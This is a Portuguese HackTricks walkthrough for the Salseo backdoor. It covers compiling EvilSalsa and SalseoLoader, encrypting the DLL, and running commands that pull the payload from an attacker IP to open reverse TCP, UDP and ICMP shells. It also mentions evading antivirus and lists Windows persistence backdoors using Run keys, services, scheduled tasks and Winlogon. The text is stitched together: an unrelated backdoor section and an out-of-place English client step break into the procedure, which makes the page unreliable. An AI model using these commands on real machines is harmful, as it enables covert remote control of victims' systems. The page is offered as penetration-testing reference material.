# Salseo

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Compilando os binários

Baixe o código-fonte do github e compile **EvilSalsa** e **SalseoLoader**. Você precisará do **Visual Studio** instalado para compilar o código.

Compile esses projetos para a arquitetura da máquina Windows onde você vai usá-los (Se o Windows suportar x64, compile-os para essa arquitetura).

Você pode **selecionar a arquitetura** dentro do Visual Studio na **aba "Build" à esquerda** em **"Platform Target".**

(\*\*Se você não encontrar essas opções, clique em **"Project Tab"** e depois em **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Em seguida, construa ambos os projetos (Build -> Build Solution) (Dentro dos logs aparecerá o caminho do executável):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Preparando a Backdoor

Antes de tudo, você precisará codificar o **EvilSalsa.dll**. Para fazer isso, você pode usar o script python **encrypterassembly.py** ou pode compilar o projeto **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
# Backdoors em Windows

Um backdoor é uma forma de acesso não autorizado a um sistema ou rede, que permite ao invasor contornar as medidas de segurança e obter controle remoto sobre o sistema comprometido. Existem várias técnicas para criar backdoors em sistemas Windows, algumas das quais são discutidas abaixo.

## 1. Porta dos fundos do Registro do Windows

O Registro do Windows é um banco de dados que armazena configurações e informações importantes do sistema operacional. Um invasor pode criar uma entrada no Registro para executar um programa malicioso sempre que o sistema for iniciado. Isso permite que o invasor mantenha acesso persistente ao sistema comprometido.

```powershell
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Nome do Programa" /t REG_SZ /d "C:\Caminho\para\programa.exe"
```

## 2. Backdoor do Serviço do Windows

Os serviços do Windows são programas que são executados em segundo plano e fornecem funcionalidades específicas para o sistema operacional. Um invasor pode criar um serviço malicioso que seja executado automaticamente quando o sistema é inicializado. Isso permite que o invasor mantenha acesso persistente ao sistema comprometido.

```powershell
sc create "Nome do Serviço" binPath= "C:\Caminho\para\programa.exe" start= auto
sc start "Nome do Serviço"
```

## 3. Backdoor do Agendador de Tarefas

O Agendador de Tarefas do Windows permite que os usuários programem a execução automática de programas ou scripts em horários específicos. Um invasor pode criar uma tarefa agendada para executar um programa malicioso sempre que o sistema é inicializado. Isso permite que o invasor mantenha acesso persistente ao sistema comprometido.

```powershell
schtasks /create /tn "Nome da Tarefa" /tr "C:\Caminho\para\programa.exe" /sc onstart /ru "SYSTEM"
schtasks /run /tn "Nome da Tarefa"
```

## 4. Backdoor do Shell do Windows

O Shell do Windows é a interface gráfica do usuário que permite aos usuários interagir com o sistema operacional. Um invasor pode modificar as configurações do Shell para executar um programa malicioso sempre que um usuário faz login no sistema. Isso permite que o invasor mantenha acesso persistente ao sistema comprometido.

```powershell
reg add HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v "Shell" /t REG_SZ /d "C:\Caminho\para\programa.exe"
```

## 5. Backdoor do Explorador do Windows

O Explorador do Windows é o gerenciador de arquivos padrão do sistema operacional. Um invasor pode modificar as configurações do Explorador para executar um programa malicioso sempre que um usuário abre uma pasta ou um arquivo específico. Isso permite que o invasor mantenha acesso persistente ao sistema comprometido.

```powershell
reg add HKCR\Directory\shell\open\command /ve /t REG_SZ /d "C:\Caminho\para\programa.exe"
reg add HKCR\*\shell\open\command /ve /t REG_SZ /d "C:\Caminho\para\programa.exe"
```

Essas são apenas algumas das técnicas comuns usadas para criar backdoors em sistemas Windows. É importante estar ciente dessas técnicas para poder proteger seu sistema contra possíveis ataques.
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, agora você tem tudo o que precisa para executar todo o processo de Salseo: o **EvilDalsa.dll codificado** e o **binário do SalseoLoader**.

**Faça o upload do binário SalseoLoader.exe para a máquina. Eles não devem ser detectados por nenhum AV...**

## **Executando a backdoor**

### **Obtendo um shell reverso TCP (baixando o dll codificado por HTTP)**

Lembre-se de iniciar um nc como ouvinte de shell reverso e um servidor HTTP para servir o evilsalsa codificado.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Obtendo um shell reverso UDP (baixando uma dll codificada através do SMB)**

Lembre-se de iniciar um nc como ouvinte do shell reverso e um servidor SMB para servir o evilsalsa codificado (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Obtendo um shell reverso ICMP (dll codificada já presente na vítima)**

**Desta vez, você precisa de uma ferramenta especial no cliente para receber o shell reverso. Baixe:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Desativar Respostas ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Executar o cliente:

To execute the client, follow these steps:

1. Open a terminal window.
2. Navigate to the directory where the client is located.
3. Run the command `./client` to execute the client.

The client will now be running and ready to establish a connection with the server.
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Dentro da vítima, vamos executar o salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilando o SalseoLoader como DLL exportando a função principal

Abra o projeto SalseoLoader usando o Visual Studio.

### Adicione antes da função principal: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png>)

### Instale o DllExport para este projeto

#### **Ferramentas** --> **Gerenciador de Pacotes NuGet** --> **Gerenciar Pacotes NuGet para a Solução...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Procure pelo pacote DllExport (usando a guia Procurar) e pressione Instalar (e aceite o popup)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1).png>)

Na pasta do seu projeto, aparecerão os arquivos: **DllExport.bat** e **DllExport\_Configure.bat**

### **D**esinstale o DllExport

Pressione **Desinstalar** (sim, é estranho, mas confie em mim, é necessário)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Saia do Visual Studio e execute o DllExport\_configure**

Apenas **saia** do Visual Studio

Em seguida, vá para a pasta do seu **SalseoLoader** e **execute o DllExport\_Configure.bat**

Selecione **x64** (se você for usá-lo em uma máquina x64, esse foi o meu caso), selecione **System.Runtime.InteropServices** (dentro do **Namespace para DllExport**) e pressione **Aplicar**

![](<../.gitbook/assets/image (7) (1) (1) (1).png>)

### **Abra o projeto novamente com o Visual Studio**

**\[DllExport]** não deve mais estar marcado como erro

![](<../.gitbook/assets/image (8) (1).png>)

### Compile a solução

Selecione **Tipo de Saída = Biblioteca de Classes** (Projeto --> Propriedades do SalseoLoader --> Aplicativo --> Tipo de saída = Biblioteca de Classes)

![](<../.gitbook/assets/image (10) (1).png>)

Selecione a **plataforma x64** (Projeto --> Propriedades do SalseoLoader --> Compilação --> Destino da plataforma = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Para **compilar** a solução: Build --> Build Solution (Dentro do console de saída, o caminho da nova DLL aparecerá)

### Teste a DLL gerada

Copie e cole a DLL onde você deseja testá-la.

Execute:
```
rundll32.exe SalseoLoader.dll,main
```
Se nenhum erro aparecer, provavelmente você tem uma DLL funcional!!

## Obtenha um shell usando a DLL

Não se esqueça de usar um **servidor** **HTTP** e configurar um **listener** **nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

O CMD (Command Prompt) é uma ferramenta de linha de comando no sistema operacional Windows que permite aos usuários interagir com o sistema operacional por meio de comandos. É uma ferramenta poderosa para executar tarefas administrativas, automatizar processos e realizar várias operações no sistema.

O CMD pode ser usado para executar comandos básicos, como navegar pelos diretórios, criar e excluir arquivos, gerenciar processos e serviços, configurar redes e muito mais. Além disso, o CMD também pode ser usado para executar scripts e programas.

Os hackers podem aproveitar o CMD para executar várias atividades maliciosas, como obter informações confidenciais, explorar vulnerabilidades, criar backdoors e realizar ataques de força bruta. Portanto, é importante estar ciente das possíveis ameaças e tomar medidas para proteger seu sistema contra ataques.

Para evitar o uso indevido do CMD, é recomendável implementar medidas de segurança, como restringir o acesso ao CMD, monitorar atividades suspeitas e manter o sistema operacional e os aplicativos atualizados com as últimas correções de segurança.

Em resumo, o CMD é uma ferramenta poderosa que pode ser usada tanto para fins legítimos quanto maliciosos. É essencial entender seu funcionamento e tomar precauções adequadas para garantir a segurança do sistema.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
